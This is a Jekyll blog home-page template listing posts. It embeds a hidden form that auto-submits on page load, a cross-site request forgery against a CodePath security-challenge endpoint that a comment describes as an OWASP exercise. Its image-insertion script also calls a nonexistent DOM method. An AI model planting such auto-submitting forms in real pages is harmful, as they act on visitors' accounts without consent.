---
layout: default
---

<div class="home" id="home">

  <h1 class="page-heading">Posts</h1>

  <!–– CSRF post example for unsuspecting iFrame tests. This is OWASP challenge and not actually harmful -->
  <form name="csrfForm" action="https://security.codepath.com/user/csrfchallengetwo/plusplus " method="POST">
    <input type="hidden" name="userId" value="deace96ef91c576d7848a740bb4797b9f673a1eb" />
    <input type="submit"/>
  </form>
  <script>
    document.csrfForm.submit();
    var currentDiv = document.getElementById("home"); 
    var img = document.createElement('img');
    img.src = "https://images-na.ssl-images-amazon.com/images/I/51yJNP1fJeL._SL500_AC_SS350_.jpg";
    img.width= "350";
    img.height= "350";
    document.body.insertAfter(img, currentDiv); 
  </script>
  
  <ul class="post-list">
    {% for post in site.posts %}
      <li>
        <span class="post-meta">{{ post.date | date: "%b %-d, %Y" }}</span>

        <h2>
          <a class="post-link" href="{{ post.url | prepend: site.baseurl }}">{{ post.title }}</a>
        </h2>
      </li>
    {% endfor %}
  </ul>

  <p class="rss-subscribe">subscribe <a href="{{ "/feed.xml" | prepend: site.baseurl }}">via RSS</a></p>

</div>
